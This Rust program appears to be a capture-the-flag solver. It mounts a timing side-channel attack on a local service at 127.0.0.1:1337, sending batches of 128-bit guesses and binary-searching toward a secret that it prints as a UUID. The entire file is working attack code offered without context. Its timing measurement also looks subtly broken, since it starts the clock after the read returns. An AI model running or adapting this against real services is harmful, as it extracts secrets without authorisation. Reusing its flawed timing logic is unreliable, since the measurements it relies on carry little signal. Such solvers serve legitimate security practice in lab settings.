use std::io::prelude::*;
use std::net::Shutdown;
use std::net::TcpStream;
use std::str;
use std::time::Instant;
use uuid::Uuid;

fn main() {
    let mut middle: u128 = u128::MAX / 2;
    let mut i = 2;
    while i < 127 {
        let mut right: u128 = 0;
        let mut left: u128 = 0;

        for _ in 0..200 {
            right += check_mid(middle, "+")
                .expect("connection failed")
                .elapsed()
                .as_nanos();
                left += check_mid(middle, "-")
                .expect("connection failed")
                .elapsed()
                .as_nanos();
        }
        if right > left && right.wrapping_sub(left) > 20000 {
            middle = middle + (u128::MAX / 2u128.pow(i));
            i += 1;

        } else if left > right && left.wrapping_sub(right) > 20000 {
            middle = middle - (u128::MAX / 2u128.pow(i));
            i += 1;

        }
        println!(
            "middle {} : {} : {:?}  : {:?}",
            i,
            middle,
            Uuid::from_bytes(middle.to_be_bytes()),
            middle
                .to_be_bytes()
                .iter()
                .map(|&byte| byte as char)
                .collect::<Vec<char>>()
        );
    }
}

fn check_mid(middle: u128, sign: &str) -> std::io::Result<std::time::Instant> {
    let mut stream = TcpStream::connect("127.0.0.1:1337")?;
    for i in 0..1000 {
        if sign == "+" {
            stream.write(&(middle + i).to_be_bytes())?;
        } else {
            stream.write(&(middle - i).to_be_bytes())?;
        }
    }
    stream.shutdown(Shutdown::Write)?;
    let mut buffer: [u8; 4] = [1, 1, 1, 1];
    stream.read(&mut buffer)?;
    let now = Instant::now();
    Ok(now)
}
